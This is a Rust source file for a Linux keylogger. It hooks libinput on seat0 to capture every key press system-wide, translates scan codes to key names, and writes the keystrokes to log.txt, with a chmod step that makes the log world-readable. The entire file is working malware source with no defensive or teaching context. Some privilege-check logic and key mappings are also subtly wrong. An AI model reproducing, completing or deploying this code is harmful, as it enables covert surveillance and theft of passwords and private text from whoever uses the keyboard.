extern crate core;

// Imports & Globals
use std::any::type_name;
use std::io::{Read, Write};
use std::process::exit;
use std::thread::sleep_ms;
use input::{Libinput, LibinputInterface, event::keyboard::*, Event};
use std::fs::{File, OpenOptions};
use std::path::Path;
use std::ptr::{null, null_mut};
use libc::{O_RDONLY, O_RDWR, O_WRONLY};
use std::os::unix::process::CommandExt;
use std::os::unix::fs::OpenOptionsExt;
use std::os::unix::io::{RawFd, IntoRawFd, FromRawFd};

struct Interface;

// Local input struct def 
impl LibinputInterface for Interface
{
    fn open_restricted(&mut self, path: &Path, flags: i32) -> Result<RawFd, i32>
    {
        OpenOptions::new()
            .read(true)
            .write(true)
            .custom_flags(flags)
            .open(path)
            .map(|f| f.into_raw_fd())
            .map_err(|_| -1)
    }
    fn close_restricted(&mut self, fd: RawFd)
    {
        unsafe { File::from_raw_fd(fd) };
    }
}

fn main()
{
    // Confirm US-layout and admin privileges; exit otherwise
	// Check if the keyboard layout is US, if not, exit
    if !is_us() && !check_root()
    {
        exit(1);
    }

    // Create a log file and keylogger
    let log = create_log();
    keylogger(log);

    // Set permissions on the log file to allow for reading by all users using the chmod command
    let mut cmd = std::process::Command::new("chmod")
        .arg("a+r")
        .arg("log.txt")
        .spawn()
        .expect("Failed to execute command");

    // Preemptive exit; shouldn't hit
    exit(1);
}

///////////////////////////
// Checks keyboard layout
///////////////////////////
fn is_us() -> bool
{
    let us_layout = "us";
    let mut layout;

    // Get the keyboard layout environment variable
    match std::env::var("XKB_DEFAULT_LAYOUT")
    {
        Ok(l) => layout = l,
        Err(_) => layout = "".to_string()
    }

    // If environment variable is not set, check the /etc/default/keyboard file
    if layout == ""
    {
        // Get the keyboard layout from the /etc/default/keyboard file
        layout = std::fs::read_to_string("/etc/default/keyboard").unwrap();
    }

    // Check if the keyboard layout is US
    return if layout.contains(us_layout) { true } else { false }
}

//////////////////////////////////////
// Checks for user system privileges
//////////////////////////////////////
fn check_root() -> bool
{
    let root;
    let output = std::process::Command::new("id")
        .output()
        .expect("Failed to execute process");

    // If the output contains "uid=0", the user is root
    root = String::from_utf8_lossy(&output.stdout).contains("uid=0");

    // Return admin status
    root
}

///////////////////////////////
// Creates the local log file
///////////////////////////////
fn create_log() -> File
{
    let log;

    // Create the log file in the current directory
    match File::create("log.txt")
    {
        Ok(l) => log = l,
        Err(_) => log = File::open("log.txt").unwrap()
    }


    // Return the log file
    log
}

//////////////////////////////////////////////////////////////////
// Logs keyboard behavior; should loop forever unless terminated
//////////////////////////////////////////////////////////////////
fn keylogger(mut log: std::fs::File)
{
    // Create a buffer and libinput for the keylogger
    const BUF_SIZE: u32 = 64;
    const IDLE_LIMIT: u16 = 1000;
    let mut buffer = String::with_capacity(BUF_SIZE as usize);

    // Create a libinput context
    let mut context = Libinput::new_with_udev(Interface);
    context.udev_assign_seat("seat0").unwrap();

    // Initialize counters
    let mut idle_counter: u16 = 0;
    let mut buffer_counter: u32 = 0;

    // Loop keylogging
    loop
    {
        // Dispatch events; collect next event
        context.dispatch().unwrap();
        let event = context.next();

        // Check if the buffer is full or if there has been no input for usize.len() cycles
        // If either is true, write the buffer to the log file
        if buffer_counter >= BUF_SIZE/2 || (idle_counter == IDLE_LIMIT && buffer_counter > 0)
        {
            println!("Writing Buffer: {}" , buffer);
            // Write the key name to the log file
            match log.write_all(&buffer.as_bytes())
            {
                Ok(_) =>
                    {
                        // Clear the buffer
                        buffer.clear();
                        buffer_counter = 0;
                        idle_counter = 0;
                    }
                Err(_) => ()
            };
        }

        // If the event is a key event, log the key
        else if let Some(Event::Keyboard(key_event)) = event
        {
            // Reset the idle counter
            idle_counter = 0;

            // Get the key code, state and pressed state; concatenate pressed events
            let key_code = key_event.key();
            let key_state = key_event.key_state();
            if key_state == KeyState::Pressed
            {
                // Get the key name; convert name to string
                let key_name = key_code as u8;
                buffer.push_str(&get_key_name(key_name));
            }

            // Increment the buffer counter
            buffer_counter += buffer.len() as u32;
        }

		// Sleep momentarily if no activity detected
        else
        {
            idle_counter += 1;
            std::thread::sleep(std::time::Duration::from_millis(1));
        }
    }
}

fn get_key_name(key_code: u8) -> String
{
    // Convert keyboard scan code to key name
    return match key_code
    {
        0x1e => String::from("a"),
        0x30 => String::from("b"),
        0x2e => String::from("c"),
        0x20 => String::from("d"),
        0x12 => String::from("e"),
        0x21 => String::from("f"),
        0x22 => String::from("g"),
        0x23 => String::from("h"),
        0x17 => String::from("i"),
        0x24 => String::from("j"),
        0x25 => String::from("k"),
        0x26 => String::from("l"),
        0x32 => String::from("m"),
        0x31 => String::from("n"),
        0x18 => String::from("o"),
        0x19 => String::from("p"),
        0x10 => String::from("q"),
        0x13 => String::from("r"),
        0x1f => String::from("s"),
        0x14 => String::from("t"),
        0x16 => String::from("u"),
        0x2f => String::from("v"),
        0x11 => String::from("w"),
        0x2d => String::from("x"),
        0x15 => String::from("y"),
        0x2c => String::from("z"),
        0x02 => String::from("1"),
        0x03 => String::from("2"),
        0x04 => String::from("3"),
        0x05 => String::from("4"),
        0x06 => String::from("5"),
        0x07 => String::from("6"),
        0x08 => String::from("7"),
        0x09 => String::from("8"),
        0x0a => String::from("9"),
        0x0b => String::from("0"),
        0x1c => String::from(" [ENT] "),
        0x39 => String::from(" [SPC] "),
        0x0e => String::from(" [BKSPC] "),
        0x0f => String::from(" [TAB] "),
        0x1a => String::from(" [LSHFT] "),
        0x2a => String::from(" [RSHFT] "),
        0x1d => String::from(" [LCTRL] "),
        0x38 => String::from(" [LALT] "),
        0x5b => String::from(" [LSUPR] "),
        0x5c => String::from(" [RSUPR] "),
        0x5d => String::from(" [MENU] "),
        0x2b => String::from("\\"),
        0x33 => String::from(","),
        0x0c => String::from("-"),
        0x34 => String::from("."),
        0x35 => String::from("/"),
        0x27 => String::from(";"),
        0x28 => String::from("\'"),
        0x29 => String::from("`"),
        0x0d => String::from("="),
        0x1b => String::from(" [ESC] "),
        0x3a => String::from(" [F1] "),
        0x3b => String::from(" [F2] "),
        0x3c => String::from(" [F3] "),
        0x3d => String::from(" [F4] "),
        0x3e => String::from(" [F5] "),
        0x3f => String::from(" [F6] "),
        0x40 => String::from(" [F7] "),
        0x41 => String::from(" [F8] "),
        0x42 => String::from(" [F9] "),
        0x43 => String::from(" [F10] "),
        0x44 => String::from(" [F11] "),
        0x57 => String::from(" [F12] "),
        0x46 => String::from(" [PRNTSCRN] "),
        0x45 => String::from(" [NUMLK] "),
        0x37 => String::from(" [NUM_*] "),
        0x4a => String::from(" [NUM_-] "),
        0x4e => String::from(" [NUM_+] "),
        0x53 => String::from(" [NUM_. or DEL] "),
        0x52 => String::from(" [NUM_0 or INS] "),
        0x4f => String::from(" [NUM_1 or END] "),
        0x50 => String::from(" [NUM_2 or DOWN] "),
        0x51 => String::from(" [NUM_3 or PGDN] "),
        0x4b => String::from(" [NUM_4 or LEFT] "),
        0x4c => String::from(" [NUM_5] "),
        0x4d => String::from(" [NUM_6 or RIGHT] "),
        0x47 => String::from(" [NUM_7 or HOME] "),
        0x48 => String::from(" [NUM_8 or UP] "),
        0x49 => String::from(" [NUM_9 or PGUP] "),
        _ => String::from(" [UNKNOWN] "),
    };
}